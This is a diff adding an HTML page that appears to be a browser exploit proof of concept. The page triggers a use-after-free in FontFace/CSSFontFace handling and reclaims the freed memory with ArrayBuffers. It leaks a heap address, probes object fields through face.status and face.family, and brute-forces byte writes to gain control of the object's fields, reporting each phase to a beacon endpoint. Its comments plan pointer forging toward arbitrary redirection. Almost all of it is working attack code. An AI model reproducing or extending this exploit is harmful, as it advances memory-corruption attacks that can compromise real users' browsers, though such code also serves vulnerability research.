@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P834</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+h2{color:#d2a8ff;font-size:15px;margin:12px 0 4px;}
+</style>
+</head><body>
+<pre id="o">P834: FontFace UAF Property Oracle + Fake Field Write Test</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P834-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+log('Booting P834...','info');
+
+/* ===== PHASE A: FontFace UAF trigger ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find reclaimed AB (most nonzero bytes) */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('FontFace reclaim missed (nz='+bestNz+'), reloading...','fail');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var bu=new BigUint64Array(ab);
+  var dv=new DataView(ab);
+  var u8=new Uint8Array(ab);
+
+  bn('RECLAIM','idx='+bestI+'|nz='+bestNz);
+  log('Phase A: Reclaimed AB['+bestI+'] nz='+bestNz+'/192','ok');
+
+  /* Compute H from q11 (+0x58) */
+  var q11=bu[11];
+  var q11lo=Number(q11&0xFFFFFFFFn);
+  var q11hi=Number(q11>>32n);
+  var Hstr='unknown';
+  if(q11hi>0){
+    var borrow=(q11lo<0x68)?1:0;
+    var H_hi=q11hi-borrow,H_lo=(q11lo-0x68)>>>0;
+    Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  }
+  bn('HEAP','H='+Hstr+'|q11=0x'+q11.toString(16).padStart(16,'0'));
+  log('H (self_addr) = '+Hstr,'ok');
+
+  /* Quick dump of nonzero qwords */
+  var nzList=[];
+  for(var q=0;q<24;q++){
+    if(bu[q]!==0n){
+      nzList.push('q'+q+'=0x'+bu[q].toString(16).padStart(16,'0'));
+    }
+  }
+  log('Nonzero: '+nzList.join(' '),'info');
+
+  /* ===== PHASE B: Test face.status (byte read from m_backing) ===== */
+  log('','');
+  log('--- Phase B: face.status oracle test ---','hot');
+
+  var statusResult='CRASH';
+  try{
+    statusResult=face.status;
+  }catch(e){
+    statusResult='EXCEPTION:'+e.message;
+  }
+  bn('STATUS-B','result='+statusResult);
+  if(statusResult==='unloaded'){
+    log('face.status = "'+statusResult+'" (m_status=0=Pending -> Unloaded)','ok');
+    log('STATUS ORACLE WORKS! CSSFontFace byte read via m_backing confirmed!','hot');
+  }else if(typeof statusResult==='string'&&statusResult.length>0&&statusResult.indexOf('EXCEPTION')<0){
+    log('face.status = "'+statusResult+'" (unexpected value but READABLE!)','info');
+  }else{
+    log('face.status = '+statusResult+' (FAILED)','fail');
+  }
+
+  /* ===== PHASE C: Test other FontFace properties ===== */
+  log('','');
+  log('--- Phase C: Other FontFace property tests ---','hot');
+
+  var props=['family','style','weight','stretch','unicodeRange','display','ascentOverride','descentOverride','lineGapOverride','sizeAdjust','featureSettings'];
+  var propResults={};
+  for(var p=0;p<props.length;p++){
+    var name=props[p];
+    try{
+      var v=face[name];
+      propResults[name]=String(v).slice(0,60);
+      var cls=(v!==undefined&&v!==null)?'ok':'info';
+      log('  face.'+name+' = "'+propResults[name]+'"',cls);
+    }catch(e){
+      propResults[name]='ERR:'+e.message.slice(0,40);
+      log('  face.'+name+' = EXCEPTION: '+e.message.slice(0,60),'fail');
+    }
+  }
+  bn('PROPS',JSON.stringify(propResults).slice(0,800));
+
+  /* ===== PHASE D: Write to AB and re-test status ===== */
+  log('','');
+  log('--- Phase D: Write test patterns + re-check status ---','hot');
+
+  /* Strategy: m_status is an enum uint8_t somewhere in the 192B CSSFontFace.
+     Writing 3 (Loaded) at the right byte should change face.status to "loaded".
+
+     We know:
+     - Base (refcount + weakptr): 0-15
+     - m_propertiesOrCSSConnection (Variant 16B): 16-31
+     - m_family (RefPtr 8B): 32-39
+     - m_ranges (Vector 16B): 40-55
+     - m_featureSettings (Vector 16B): 56-71
+     - Various small fields...
+     - m_status: somewhere around byte 176-191 (near the end)
+
+     Binary search: try writing 3 at byte 176, then check status.
+     If still unloaded, try 184, 160, etc.
+  */
+
+  /* First, check the CURRENT status to establish baseline */
+  var baseline='CRASH';
+  try{baseline=face.status;}catch(e){baseline='ERR';}
+  bn('BASELINE','status='+baseline);
+  log('Baseline status before writes: "'+baseline+'"','info');
+
+  if(baseline==='ERR'||baseline==='CRASH'){
+    log('Cannot read status — aborting write tests','fail');
+    bn('DONE','status_oracle=DEAD');
+    log('','');
+    log('=== P834 COMPLETE (status oracle dead) ===','fail');
+    return;
+  }
+
+  /* Write m_status=3 (Loaded) at candidate offsets.
+     CSSFontFace is 192 bytes. m_status is a uint8_t near the end.
+     Try every 8th byte in range [128, 192) first, then narrow. */
+
+  var statusFound=-1;
+  var scanOffsets=[];
+  /* Broad scan: try every byte from 120..191 */
+  for(var off=120;off<192;off++){
+    scanOffsets.push(off);
+  }
+  /* Also scan 72..119 in case it's earlier than expected */
+  for(var off=72;off<120;off++){
+    scanOffsets.push(off);
+  }
+
+  /* Save original bytes for restoration */
+  var origBytes=new Uint8Array(192);
+  origBytes.set(u8);
+
+  for(var si=0;si<scanOffsets.length;si++){
+    var off=scanOffsets[si];
+
+    /* Restore all bytes to original first */
+    u8.set(origBytes);
+
+    /* Write 3 (Loaded) at this offset */
+    u8[off]=3;
+
+    /* Check status */
+    var testStatus='CRASH';
+    try{testStatus=face.status;}catch(e){testStatus='ERR';}
+
+    if(testStatus==='loaded'){
+      statusFound=off;
+      bn('STATUS-FOUND','offset='+off+'|status=loaded');
+      log('STATUS OFFSET FOUND: byte '+off+' (0x'+off.toString(16)+') = m_status!','hot');
+
+      /* Verify by writing other values */
+      u8.set(origBytes);
+      u8[off]=1; /* Loading */
+      var s1='?';try{s1=face.status;}catch(e){s1='ERR';}
+
+      u8.set(origBytes);
+      u8[off]=4; /* Failure */
+      var s4='?';try{s4=face.status;}catch(e){s4='ERR';}
+
+      u8.set(origBytes);
+      u8[off]=0; /* Pending */
+      var s0='?';try{s0=face.status;}catch(e){s0='ERR';}
+
+      bn('STATUS-VERIFY','off='+off+'|v0='+s0+'|v1='+s1+'|v3=loaded|v4='+s4);
+      log('  val=0 -> "'+s0+'" (expect unloaded)','info');
+      log('  val=1 -> "'+s1+'" (expect loading)','info');
+      log('  val=3 -> "loaded" (CONFIRMED)','ok');
+      log('  val=4 -> "'+s4+'" (expect error)','info');
+
+      var allMatch=(s0==='unloaded'&&s1==='loading'&&s4==='error');
+      log('  All status values match: '+(allMatch?'YES':'NO'),'hot');
+      bn('STATUS-ALL-MATCH','match='+allMatch+'|off='+off);
+      break;
+    }
+  }
+
+  /* Restore original bytes */
+  u8.set(origBytes);
+
+  if(statusFound<0){
+    log('m_status byte NOT FOUND in range 72-191','fail');
+    bn('STATUS-SCAN','found=false');
+  }
+
+  /* ===== PHASE E: Test face.family after writing fake pointer ===== */
+  log('','');
+  log('--- Phase E: face.family pointer-chase test ---','hot');
+
+  /* family() goes through: m_backing->properties() -> switchOn(m_propertiesOrCSSConnection)
+     m_propertiesOrCSSConnection is at CSSFontFace+16 (Variant, 16B total)
+     Data (pointer) at +16, index at +24.
+
+     If we point m_propertiesOrCSSConnection to memory we control,
+     and set up a fake MutableStyleProperties there, we can redirect
+     the property lookup.
+
+     For now, just test: what does face.family return with zeroed AB? */
+
+  u8.set(origBytes); /* restore */
+
+  var familyResult='CRASH';
+  try{
+    familyResult=face.family;
+    if(familyResult===undefined)familyResult='(undefined)';
+    else if(familyResult===null)familyResult='(null)';
+    else familyResult=String(familyResult).slice(0,100);
+  }catch(e){
+    familyResult='EXCEPTION:'+e.message.slice(0,80);
+  }
+  bn('FAMILY','result='+familyResult);
+  log('face.family = '+familyResult,(familyResult.indexOf('EXCEPTION')>=0||familyResult==='CRASH')?'fail':'ok');
+
+  /* Test if family crashes or returns the original value */
+  if(familyResult.indexOf('EXCEPTION')<0&&familyResult!=='CRASH'){
+    log('family() is ACCESSIBLE after UAF!','hot');
+
+    /* Does it return the original family name or read from AB? */
+    if(familyResult==='f1'){
+      log('Returns ORIGINAL name "f1" — stored on FontFace, NOT from CSSFontFace','info');
+    }else if(familyResult===''){
+      log('Returns EMPTY string — CSSFontFace pointer chain returned null','info');
+    }else{
+      log('Returns unexpected: "'+familyResult+'" — needs investigation','hot');
+    }
+  }
+
+  /* ===== PHASE F: Summary ===== */
+  log('','');
+  log('====== P834 RESULTS SUMMARY ======','hot');
+  log('H (self_addr): '+Hstr,'ok');
+  log('face.status oracle: '+(baseline!=='ERR'?'WORKS':'DEAD'),'hot');
+  if(statusFound>=0){
+    log('m_status offset: byte '+statusFound+' (0x'+statusFound.toString(16)+')','hot');
+  }
+  log('face.family: '+familyResult,'info');
+  log('Writable properties: '+(statusFound>=0?'YES — full byte control confirmed':'not yet found'),'hot');
+
+  var summary='H='+Hstr;
+  summary+='|status_oracle='+(baseline!=='ERR');
+  summary+='|m_status_off='+(statusFound>=0?statusFound:'none');
+  summary+='|family='+familyResult.slice(0,40);
+  bn('DONE',summary);
+
+  log('','');
+  log('=== P834 COMPLETE ===','ok');
+
+},800);
+</script></body></html>
